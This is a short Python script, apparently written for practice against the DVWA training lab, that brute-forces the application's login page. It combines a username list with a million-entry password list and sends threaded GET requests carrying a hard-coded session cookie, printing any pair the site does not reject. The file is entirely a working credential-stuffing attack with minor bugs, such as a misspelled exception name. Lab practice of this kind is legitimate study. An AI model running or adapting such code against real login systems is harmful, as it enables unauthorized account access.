import requests
from concurrent.futures import ThreadPoolExecutor



cookies = {'PHPSESSID' : '73067cf41d670a0c7ad5912a89dfe26f', 'security' : 'high'}



nome_utente = []
passwords = []

num_requests = 200
batch_size = 15  # Numero di richieste in ciascuna batch
max_workers = num_requests // batch_size
with open('usernames.txt','r') as username :
	nome_utente = username.read().splitlines()

with open('1000000-password-seclists.txt','r') as password :
	passwords = password.read().splitlines()
		#print("nome_utente", nome_utente)
		#print("password", passwords)



	def send_get_request(url,n ,p):

		try:

			response = requests.get(url, cookies=cookies)
			#print(response.url)
			if ('incorrect' not in response.text):
				print('username=' + n +',&password=' + p) #dichiarare in def n e p
				
		except requests.exceptions.RquestException as e:
			return f'Error: {e}'
		
	with ThreadPoolExecutor(max_workers=num_requests) as executor:

		for n in nome_utente:
			for p in passwords:

				url = '' 
				url += 'http://192.168.1.34/dvwa/vulnerabilities/brute/?'
				url += 'username=' + n
				url += '&password=' +p
				url += '&Login=Login'

				executor.submit(send_get_request, url, n, p)
